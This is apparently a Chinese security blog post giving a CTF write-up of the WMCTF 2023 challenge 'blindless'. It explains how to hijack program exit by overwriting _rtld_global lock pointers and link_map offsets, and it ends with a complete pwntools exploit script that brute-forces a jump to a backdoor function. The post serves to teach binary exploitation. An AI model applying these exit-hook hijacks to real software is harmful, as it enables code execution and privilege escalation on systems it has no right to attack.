#  内存利用：迟来的blindless与逃不掉的exit漏洞   
N1nEmAn  蚁景网络安全   2025-04-23 09:35  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5znJiaZxqldyq3SBEPw0n6hCXNk6PmR3gyPFJDUCibH91GiaAHHKiaCpcsfnQJ2oImQunzubgDtpxzxNHONU88CypA/640?wx_fmt=gif&from=appmsg "")  
# 0x01 前言  
  
在计算机安全领域，漏洞的危险性往往与其广泛性和潜在攻击方式密切相关。今天，我们将深入探讨一个异常危险的漏洞，它存在于程序退出时执行的常见函数"exit"中。无论是在操作系统还是应用程序中，"exit"都是一个普遍存在的函数，通常用于正常退出程序。但这种普遍性也使得它成为了潜在的攻击目标。  
  
这个漏洞的威胁性在于，它不仅存在于各种程序中，而且有多种潜在的攻击方式。攻击者可以通过利用这一漏洞来执行恶意代码，获取系统权限，或者实施其他恶意行为。要理解这个漏洞的威胁，我们需要深入分析其背后的原理以及不同的利用方式。  
  
在本文中，我们将探讨这个漏洞的具体情况，并详细分析了两种主要的利用方式：一种是将程序流转向libc库中的函数，另一种是将程序流转向程序本身的代码段。我们将深入研究这两种攻击方式的原理，并展示了一个实际漏洞利用的示例。  
  
"blindless"是来自WMCTF 2023比赛的一个题目，虽然难度不高，但要深入理解并利用其中的漏洞，需要花费大量时间。本文总结了有关"exit_hook2libc"和"exit_hook2elf"的利用方法，旨在分享给大家学习。这题的关键是深入理解程序退出时执行的"exit"函数，以及如何通过不同方式实现漏洞利用。  
# 0x02 exit_hook的n种姿势  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPn67l3562S3Rkn8ANRQDrdeUmqkKWea7DNlSm5tFrzfuziaclslLw2I2Q/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
基地址放在此处供各位参考一下，用于计算指令偏移。  
### exit_hook2libc  
  
首先是p &_rtld_global  
（看地址），他有一个rtld_lock_default_lock_recursive  
和rtld_lock_default_unlock_recursive  
的元素可以改来调用。  
> 注意一定要用docker或者虚拟机，否则没有符号表会特别坐牢！  
  
  
执行p _rtld_global  
。看到那两个rtld_lock_default_lock_recursive  
和rtld_lock_default_unlock_recursive  
吗，就是他们两个。我们可以修改他们的内容，从而作为exithook进行调用（直接call）。把后面的东西复制过来p &xxx  
就可以查看其地址了。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPn5OMczvoJohdSqclLv0DHG2Nr373LlZEaZb7etdfZwYh3dgHK2XLEdw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
注意看，这个程序叫小帅，他调用的第一个参数就是rdi，是_rtld_global+2312  
，我们可以控制他的参数为/bin/sh\x00  
然后做坏坏的事情（如果能把rtld_lock_default_lock_recursive  
也改成system  
的话）。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPn16p338xBqjmsHgDmtzWUIJuicFpxTnW7licVUQfkjXnzNPqjEZ4uiajsw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
然后rtld_lock_default_unlock_recursive  
的参数也是2312这个偏移。  
> 注意这个2312是十进制。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPnwjFfMiatr1obeYib2dc5xDTiaDbT2ibbxd6mh20XS9jT2Z6Z5icOxlDezgQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
好的，我们就修改这两个地方就可以为所欲为了，但是exit_hook  
到这里还没完。  
  
并且严格来说，这里并不是完全的exit_hook2libc  
，如果知道elf的地址也完全可以返回到elf上的函数。  
  
接下来还有更骚的，可以控制到程序上的地址（直接跳转，或者间接取地址跳转。）  
### exit_hook2elf  
#### 1.间接call  
  
这个在这里，第一个是间接call，即指令是call qword ptr [寄存器]  
，意思就是从寄存器的地址指向的内存里取地址，然后call。  
  
对于间接call的利用，我们可以修改他的偏移到任意函数got表，然后配合参数rdi_rtld_global+2312  
使用。  
> 例如修改_rtld_global+2312为"/bin/sh\x00"  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPnTbqbsl3Ed8llXUsyKu8nrOstfWgESTOIR3zOTaW4BH0Nghjw8xdYAg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
这个的基地址和偏移是存在于link_map  
的，这样可以找到他的地址。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPnSMtzjgz3lUNaUbBOEcu8mkMjnjl3t3qUbianaoPZ9QakHPEicuyibPibPA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
调试可以看到他会从这个地址的内存中取elf基地址，然后通过link_map地址+0x110存的地址取偏移。我们可以改基地址也可以选择改偏移。link_map地址+0x110是存第一个间接call的偏移的。  
> 注意存的是偏移-8的地址，也就是如果要改的话要改成目标-8。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPnzKF8PDw3zicbojtsibg1qjJO3mBZH69ej3icqHtj2PpjRgn3xM8QZkniaQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
#### 2.直接call  
  
link_map地址+0xa8是存第二个直接call的偏移  
> 注意存的是偏移-8的地址，也就是如果要改的话要改成目标-8。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPnSezAcdXfQT8Uwk4FMc4nv8SrWzt0y6qumbzPPXQtW8ia4oJZncHFzoQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
如果改偏移的话能改最好，还能直接形成调用链子。但是如果没有偏移，就只能改基地址了——也就是p &l  
出来那儿。但是这样肯定会损坏第一次call r14  
的，会导致无法正常进行。  
  
但是发现有一个地方判断可以跳过call r14  
。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPnvErCCKZFhNjKIJaqIDe5N5xkU7JCgajCVr9G5ljvbBIDAZ72kRx39w/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
就是这里，test edx,edx  
是edx和edx相互and，留下标志位。简单来说就是如果是0，那么不跳转。如果是1，那么跳转。  
> 在x86汇编中，je  
 指令的作用是：  
> 1. 检查零标志位（ZF）是否被设置为 1。2. 如果零标志位被设置为 1，将进行跳转到指定的目标位置。  
  
  
回溯发现是从link_map+0x120  
取来的地址，也就是说想要这里为0，就把那里的地址指向为0的地方即可！不过也要注意，这里取的是地址+8，也就是我们要改成目标地址-8改进去。这里直接找bss段之类的即可。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPnGEib9aiaz2JzRsNkD3HialEZibkIkVF1eswkSdk2Oez4QDwmW5qkXSj0gg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
完成这个操作，就可以修改基地址达到任意直接call的效果了！即使没有泄露，也可直接返回到程序上（比如此题有后门）。如果有，那就是为所欲为！（和前面一样，如果有泄露真的就是为所欲为了）。  
# 0x03 exp  
  
那么本题目由于有brainfuck函数可以执行任意地址写，则根据前面的exit_hook可以做到提权。  
```
from pwn import *


n2b = lambda x    : str(x).encode()
rv  = lambda x    : p.recv(x)
rl  = lambda     :p.recvline()
ru  = lambda s    : p.recvuntil(s)
sd  = lambda s    : p.send(s)
sl  = lambda s    : p.sendline(s)
sn  = lambda s    : sl(n2b(n))
sa  = lambda t, s : p.sendafter(t, s)
sla = lambda t, s : p.sendlineafter(t, s)
sna = lambda t, n : sla(t, n2b(n))
ia  = lambda      : p.interactive()
rop = lambda r    : flat([p64(x) for x in r])
uu64=lambda data :u64(data.ljust(8,b'\x00'))

while True:

        context(os='linux', arch='amd64', log_level='debug')
        p = process('./main')
        context.terminal = ['tmux','new-window' ,'-n','-c']
        #gdb.attach(p)
        sla('ze',b'-10')#分配到libc上（用mmap）
        sla('ze',b'256')

        pay = b'@'+p32(2148618432)#到ld的地址+0x2f190的偏移
        pay += b'@'+p32(2148618432)
        pay +=b'.' + b'\xb1'
        pay += b'>.' + b'\x7c'#使得加了偏移之后是后门函数地址
        pay += b'@'+p32(0x11f)#修改0x120的地址，指向0，跳过call r14
        pay +=b'.' + b'\x00'
        pay += b'q'
        sla('code\n',pay)

        re = p.recvrepeat(0.1)#一直接收直到有回显
        #如果是system的话可以发一个cat flag再这样
        #这是个很好的爆破方式，学习学习
        if re:
            print('pwned!get your flag here:',re)
            exit(0)
        p.close()

```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcB3fY7RmMEozpXp3AzmWPn84kuXZrx489nvDiczx8hsV1gGDfGg66Qx4LkwHvoggyUX34kojNicqpw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwoHriaVoyA6JNsGroYQAQp8xrlxS8RibJWibDF8T1pmkgSXqiaWQvmVB43S1IVCFBDOKTEQFDAP0QL5g/640?wx_fmt=png&from=appmsg "")  
  
